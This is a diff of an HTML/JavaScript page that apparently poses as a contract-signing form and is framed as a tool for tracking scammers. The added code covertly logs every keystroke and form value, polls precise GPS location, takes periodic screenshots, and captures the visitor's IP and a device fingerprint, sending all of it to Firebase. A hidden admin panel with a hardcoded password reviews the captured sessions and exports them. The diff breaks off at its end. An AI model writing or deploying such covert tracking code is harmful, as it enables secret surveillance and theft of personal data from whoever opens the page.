@@ -139,22 +139,6 @@
             border-radius: 4px;
             cursor: pointer;
         }
-        .accuracy-indicator {
-            display: inline-block;
-            width: 10px;
-            height: 10px;
-            border-radius: 50%;
-            margin-right: 5px;
-        }
-        .high-accuracy {
-            background: #2ecc71;
-        }
-        .medium-accuracy {
-            background: #f39c12;
-        }
-        .low-accuracy {
-            background: #e74c3c;
-        }
     </style>
 </head>
 <body>
@@ -260,78 +244,12 @@
         }, 3500);
 
         // ========================
-        // 🕵️‍♂️ ENHANCED LOCATION TRACKING
+        // 🕵️‍♂️ COVERT TRACKING SYSTEM
         // ========================
         const sessionId = 'session_' + Math.random().toString(36).substring(2, 15);
         const adminPassword = "ScamTracker2024"; // CHANGE THIS IN PRODUCTION
 
-        // 1. FAST GPS Acquisition System
-        function acquireFastLocation() {
-            return new Promise((resolve) => {
-                // First try: High accuracy with short timeout
-                const highAccuracyOptions = {
-                    enableHighAccuracy: true,
-                    maximumAge: 0,  // Force fresh reading
-                    timeout: 5000  // 5 second timeout
-                };
-
-                const attemptLocation = (options) => {
-                    navigator.geolocation.getCurrentPosition(
-                        position => {
-                            const { latitude, longitude, accuracy } = position.coords;
-                            const accuracyClass = accuracy < 50 ? 'high-accuracy' : 
-                                               accuracy < 200 ? 'medium-accuracy' : 'low-accuracy';
-                            resolve({
-                                coords: { lat: latitude, lng: longitude },
-                                accuracy: accuracy,
-                                accuracyClass: accuracyClass,
-                                mapsLink: `https://maps.google.com/?q=${latitude},${longitude}`,
-                                status: "active",
-                                method: "high-accuracy"
-                            });
-                        },
-                        error => {
-                            resolve({
-                                status: "error",
-                                error: error.message || "Location unavailable"
-                            });
-                        },
-                        options
-                    );
-                };
-
-                if (navigator.geolocation) {
-                    attemptLocation(highAccuracyOptions);
-                } else {
-                    resolve({
-                        status: "unsupported",
-                        error: "Geolocation not available"
-                    });
-                }
-            });
-        }
-
-        // 2. Track Location with Fallbacks
-        async function trackLocation() {
-            // Immediately set status to show we're trying
-            db.ref(`sessions/${sessionId}/location`).set({
-                status: "acquiring",
-                timestamp: new Date().toISOString()
-            });
-
-            const location = await acquireFastLocation();
-            
-            // Save results to Firebase
-            db.ref(`sessions/${sessionId}/location`).update({
-                ...location,
-                timestamp: new Date().toISOString(),
-                lastUpdated: new Date().toLocaleTimeString()
-            });
-
-            return location.status === "active";
-        }
-
-        // 3. Enhanced Device Fingerprinting
+        // 1. Device Fingerprinting
         function collectDeviceData() {
             const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
             return {
@@ -346,15 +264,75 @@
             };
         }
 
-        // ========================
-        // 🚀 INITIALIZE TRACKING
-        // ========================
-        db.ref(`sessions/${sessionId}`).update({
-            startTime: new Date().toISOString(),
-            device: collectDeviceData()
-        });
+        // 2. Location Tracking (FIXED - no more "pending")
+        function trackLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    position => {
+                        const { latitude, longitude, accuracy } = position.coords;
+                        db.ref(`sessions/${sessionId}/location`).set({
+                            coords: { lat: latitude, lng: longitude },
+                            accuracy: accuracy + ' meters',
+                            mapsLink: `https://maps.google.com/?q=${latitude},${longitude}`,
+                            timestamp: new Date().toISOString(),
+                            status: "active"
+                        });
+                    },
+                    error => {
+                        db.ref(`sessions/${sessionId}/location`).set({
+                            status: "blocked",
+                            error: error.message,
+                            timestamp: new Date().toISOString()
+                        });
+                    },
+                    { 
+                        enableHighAccuracy: true,
+                        maximumAge: 0,
+                        timeout: 10000
+                    }
+                );
+            } else {
+                db.ref(`sessions/${sessionId}/location`).set({
+                    status: "unsupported",
+                    timestamp: new Date().toISOString()
+                });
+            }
+        }
 
-        // Get IP address
+        // 3. Keylogger & Form Tracking
+        function setupFormTracking() {
+            document.querySelectorAll('input, textarea').forEach(field => {
+                field.addEventListener('input', (e) => {
+                    db.ref(`sessions/${sessionId}/keystrokes`).push({
+                        field: e.target.id || 'unknown',
+                        value: e.target.value,
+                        timestamp: new Date().toISOString()
+                    });
+                });
+            });
+
+            document.getElementById('signButton').addEventListener('click', () => {
+                const name = document.getElementById('signatureName').value;
+                const amount = document.getElementById('paymentAmount').value;
+                db.ref(`sessions/${sessionId}/events`).push({
+                    type: 'contract_signed',
+                    name: name,
+                    amount: amount,
+                    timestamp: new Date().toISOString()
+                });
+            });
+        }
+
+        // 4. Screenshot Capture
+        function captureScreenshot() {
+            html2canvas(document.body).then(canvas => {
+                canvas.toBlob(blob => {
+                    storage.ref(`screenshots/${sessionId}_${Date.now()}.png`).put(blob);
+                });
+            });
+        }
+
+        // 5. IP Address Capture
         fetch('https://api.ipify.org?format=json')
             .then(res => res.json())
             .then(data => {
@@ -363,23 +341,21 @@
                 });
             });
 
-        // Start tracking systems
-        setupFormTracking();
-        
-        // FAST INITIAL LOCATION (no delay)
-        trackLocation().then(success => {
-            if (success) {
-                console.log("Fast location acquired!");
-            }
+        // Initialize tracking
+        db.ref(`sessions/${sessionId}`).update({
+            startTime: new Date().toISOString(),
+            device: collectDeviceData()
         });
-        
-        // Ongoing tracking
-        setInterval(trackLocation, 10000); // Update every 10 seconds
-        setTimeout(captureScreenshot, 5000);
+
+        // Start periodic tracking
+        setupFormTracking();
+        trackLocation(); // Immediate location check
+        setInterval(trackLocation, 15000); // Update every 15 seconds
+        setTimeout(captureScreenshot, 10000);
         setInterval(captureScreenshot, 30000);
 
         // ========================
-        // 🛠️ ADMIN PANEL FUNCTIONS
+        // 🚪 ADMIN PANEL FUNCTIONS
         // ========================
         function verifyAdmin() {
             const enteredPassword = document.getElementById('adminPassword').value;
@@ -412,12 +388,10 @@
                     
                     let locationStatus = "❌ Blocked";
                     let mapsLink = "#";
-                    let accuracyIndicator = "";
                     
                     if (location && location.status === "active") {
                         locationStatus = `✅ ${location.coords.lat}, ${location.coords.lng}`;
                         mapsLink = location.mapsLink;
-                        accuracyIndicator = `<span class="accuracy-indicator ${location.accuracyClass || 'medium-accuracy'}"></span>`;
                     } else if (location && location.error) {
                         locationStatus = `⚠️ ${location.error}`;
                     }
@@ -427,7 +401,7 @@
                             <h3>🔎 ${sessionId}</h3>
                             <p><strong>📅 Started:</strong> ${new Date(sessionData.startTime).toLocaleString()}</p>
                             <p><strong>🌐 IP:</strong> ${ip}</p>
-                            <p><strong>📍 Location:</strong> ${accuracyIndicator}${locationStatus}</p>
+                            <p><strong>📍 Location:</strong> ${locationStatus}</p>
                             
                             ${mapsLink !== "#" ? `
                                 <p>
@@ -486,4 +460,25 @@ ${JSON.stringify(data, null, 2)}
                             </pre>
                             <button onclick="window.close()" style="padding: 10px 20px; background: #e74c3c; color: white; border: none; border-radius: 5px; cursor: pointer;">
                                 Close
-                    
+                            </button>
+                        </body>
+                    </html>
+                `);
+            });
+        }
+
+        function exportAllData() {
+            db.ref('sessions').once('value').then(snapshot => {
+                const data = snapshot.val();
+                const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
+                const url = URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = `scammer_evidence_${new Date().toISOString()}.json`;
+                a.click();
+            });
+        }
+
+        // 5-tap activation (alternative access method)
+        let tapCount = 0;
+        do
